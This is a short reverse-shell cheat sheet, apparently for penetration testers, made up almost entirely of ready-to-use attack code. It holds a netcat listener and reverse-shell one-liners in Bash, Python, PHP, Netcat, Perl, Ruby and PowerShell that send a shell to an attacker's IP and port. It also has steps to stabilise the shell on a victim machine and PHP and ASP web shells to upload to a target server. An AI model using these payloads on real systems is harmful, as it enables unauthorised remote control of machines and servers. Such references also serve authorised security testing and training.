# 🐚 Reverse Shells Cheat Sheet

**Attacker listener:**
```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444   # with arrow keys
```

---

## One-Liners (replace IP & PORT)

```bash
# Bash
bash -i >& /dev/tcp/IP/PORT 0>&1

# Bash (alternative)
bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'

# Python3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

# Python2
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (if -e flag available)
nc IP PORT -e /bin/bash

# Netcat (no -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f

# Perl
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("IP","PORT");loop{c.gets.chomp!;(exit! if $_=="exit");IO.popen($_){|io|c.print io.read}}'

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

> 🔗 Full generator: [revshells.com](https://www.revshells.com/)

---

## Upgrade Shell to Fully Interactive

```bash
# Step 1 — on victim
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z

# Step 2 — on attacker
stty raw -echo; fg

# Step 3 — on victim
export TERM=xterm
stty rows 38 columns 160
```

---

## Web Shells

```php
# PHP (save as shell.php, upload to server)
<?php system($_GET['cmd']); ?>

# Usage: http://target.com/uploads/shell.php?cmd=id
```

```asp
# ASP (Windows IIS)
<% eval request("cmd") %>
```
